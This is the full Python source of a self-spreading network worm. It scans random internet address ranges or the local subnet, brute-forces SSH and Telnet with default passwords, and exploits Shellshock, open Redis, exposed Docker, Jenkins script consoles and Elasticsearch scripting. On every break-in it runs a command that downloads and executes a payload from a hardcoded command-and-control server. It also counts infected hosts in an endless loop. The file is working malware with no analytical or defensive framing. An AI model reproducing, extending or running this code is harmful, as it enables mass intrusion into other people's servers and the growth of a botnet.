#!/usr/bin/env python3
# AVZ-Aristo Spreader v25.8.9 – port stats, detailed diagnostics
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse
import ipaddress, logging

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

C2_HOST = "80.249.146.202"
C2_PORT = 80
AGENT_URL = f"http://{C2_HOST}:{C2_PORT}/agent_bash.sh"
MAX_CONCURRENT = 500
TIMEOUT = 2.0
DEFAULT_SCAN_COUNT = 10_000
PORT_LIST = [22, 23, 80, 443, 2375, 6379, 8080, 9200]

SSH_CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"),
    ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin","1234"),
    ("user","user"), ("user","password"), ("user","123456"),
    ("test","test"), ("guest","guest"), ("root",""), ("admin",""), ("root","pceeq1s8wv")
]

RANGES = [f"{i}.0.0.0/8" for i in [1,2,3,4,5,8,9,12,14,15,20,23,24,31,34,35,37,38,40,41,43,44,45,46,47,49,50,51,52,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223]]

def random_ip():
    r = random.choice(RANGES)
    net, mask = r.split("/")
    octets = list(map(int, net.split(".")))
    host = random.randint(0, (1 << (32 - int(mask))) - 1)
    for i in range(4):
        octets[i] |= (host >> (8*(3-i))) & 0xFF
    return ".".join(map(str, octets))

def get_local_ips():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        return []
    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
    return [str(host) for host in network.hosts() if str(host) != local_ip]

async def probe_port(ip, port):
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=TIMEOUT)
        w.close(); await w.wait_closed()
        return True
    except:
        return False

async def ssh_brute(ip):
    try:
        import paramiko
        for u, p in SSH_CREDS:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=u, password=p, timeout=2, banner_timeout=2, auth_timeout=2)
                client.exec_command(f"wget -O- {AGENT_URL} | sh")
                client.close()
                return True
            except:
                continue
    except ImportError:
        pass
    return False

async def exploit_http(ip):
    urls = [f"http://{ip}/", f"http://{ip}/cgi-bin/"]
    headers = {"User-Agent": f"() {{ :; }}; wget -O- {AGENT_URL} | bash"}
    for url in urls:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=2) as resp:
                    pass
        except:
            pass
    return False

async def exploit_redis(ip):
    try:
        import redis
        r = redis.Redis(host=ip, port=6379, socket_timeout=2)
        r.ping()
        r.set('crackit', '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\n\n')
        r.config_set('dir', '/root/.ssh')
        r.config_set('dbfilename', 'authorized_keys')
        r.save(); r.close()
        return True
    except:
        pass
    return False

async def exploit_docker(ip):
    try:
        import docker
        client = docker.DockerClient(base_url=f'tcp://{ip}:2375', timeout=2)
        client.containers.run('alpine', f'wget -O- {AGENT_URL} | sh', detach=True)
        client.close()
        return True
    except:
        pass
    return False

async def exploit_jenkins(ip):
    url = f'http://{ip}:8080/script'
    script = f'println "wget -O- {AGENT_URL} | sh".execute().text'
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, data={'script': script}, timeout=2) as resp:
                return resp.status == 200
    except:
        pass
    return False

async def exploit_telnet(ip):
    for u, p in SSH_CREDS:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, 23), timeout=TIMEOUT
            )
            try:
                data = await asyncio.wait_for(reader.read(1024), timeout=1)
            except:
                data = b""
            if b"login" in data.lower() or b"username" in data.lower() or not data:
                writer.write(u.encode() + b"\n")
                await writer.drain()
                await asyncio.sleep(0.3)
                try:
                    data = await asyncio.wait_for(reader.read(1024), timeout=1)
                except:
                    data = b""
                if b"password" in data.lower() or b"asswor" in data.lower() or not data:
                    writer.write(p.encode() + b"\n")
                    await writer.drain()
                    await asyncio.sleep(0.5)
                    writer.write(f"wget -O- {AGENT_URL} | sh\n".encode())
                    await writer.drain()
                    await asyncio.sleep(0.5)
                    writer.write(b"exit\n")
                    await writer.drain()
                    writer.close()
                    return True
            writer.close()
        except:
            pass
    return False

async def exploit_elasticsearch(ip):
    payload = {"size":1, "script_fields": {"lol": {"script": f"java.lang.Runtime.getRuntime().exec('wget -O- {AGENT_URL} | sh')"}}}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(f'http://{ip}:9200/_search', json=payload, timeout=2) as resp:
                return resp.status == 200
    except:
        pass
    return False

async def exploit_wordpress(ip):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(f'http://{ip}/xmlrpc.php', data='<methodCall><methodName>system.listMethods</methodName></methodCall>', timeout=2) as resp:
                if resp.status == 200:
                    return True
    except:
        pass
    return False

async def infect(ip, port_stats):
    ports = PORT_LIST
    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
    for i, p in enumerate(ports):
        if open_ports[i]:
            port_stats[p] = port_stats.get(p, 0) + 1
    if open_ports[0] and await ssh_brute(ip):
        print(f"[INFECTED] {ip} via SSH", flush=True)
        return True
    if open_ports[5] and await exploit_redis(ip):
        print(f"[INFECTED] {ip} via Redis", flush=True)
        return True
    if open_ports[4] and await exploit_docker(ip):
        print(f"[INFECTED] {ip} via Docker", flush=True)
        return True
    if open_ports[6] and await exploit_jenkins(ip):
        print(f"[INFECTED] {ip} via Jenkins", flush=True)
        return True
    if open_ports[1] and await exploit_telnet(ip):
        print(f"[INFECTED] {ip} via Telnet", flush=True)
        return True
    if open_ports[7] and await exploit_elasticsearch(ip):
        print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
        return True
    if (open_ports[2] or open_ports[3]) and await exploit_http(ip):
        print(f"[INFECTED] {ip} via HTTP", flush=True)
        return True
    return False

async def worker(queue, stats, port_stats, progress_cb=None):
    while True:
        ip = await queue.get()
        try:
            if await infect(ip, port_stats):
                stats['success'] += 1
            else:
                stats['fail'] += 1
        except:
            stats['fail'] += 1
        if progress_cb:
            await progress_cb()
        queue.task_done()

async def scan_cycle(ips, progress_callback=None):
    q = asyncio.Queue()
    stats = {'success':0, 'fail':0}
    port_stats = {}
    count = len(ips)
    progress_count = 0

    async def progress_inner():
        nonlocal progress_count
        progress_count += 1
        if progress_count % 500 == 0 and progress_callback:
            await progress_callback(progress_count, count, stats, port_stats)

    for ip in ips:
        q.put_nowait(ip)
    tasks = [asyncio.create_task(worker(q, stats, port_stats, progress_inner)) for _ in range(MAX_CONCURRENT)]
    await q.join()
    for t in tasks:
        t.cancel()
    return stats, port_stats

async def global_scan(count, progress_callback=None):
    ips = [random_ip() for _ in range(count)]
    return await scan_cycle(ips, progress_callback)

async def local_scan(progress_callback=None):
    ips = get_local_ips()
    if not ips:
        return {'success':0, 'fail':0}, {}
    print(f"[*] Scanning local network, {len(ips)} hosts", flush=True)
    return await scan_cycle(ips, progress_callback)

async def main_async(args):
    print("[*] Checking C2 connection...", flush=True)
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"ping")
        s.recv(1024)
        s.close()
        print("[+] C2 reachable", flush=True)
    except Exception as e:
        print(f"[!] C2 unreachable: {e}", flush=True)

    async def gui_progress(current, total, stats, port_stats):
        port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
        if port_str:
            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
        else:
            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)

    if args.local:
        print("[*] Mode: local network", flush=True)
        while True:
            stats, port_stats = await local_scan(gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)
    else:
        print(f"[*] Mode: global, {args.count} targets per cycle", flush=True)
        while True:
            stats, port_stats = await global_scan(args.count, gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
    group.add_argument('--local', action='store_true')
    args = parser.parse_args()

    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n[*] Spreader stopped", flush=True)

if __name__ == '__main__':
    main()
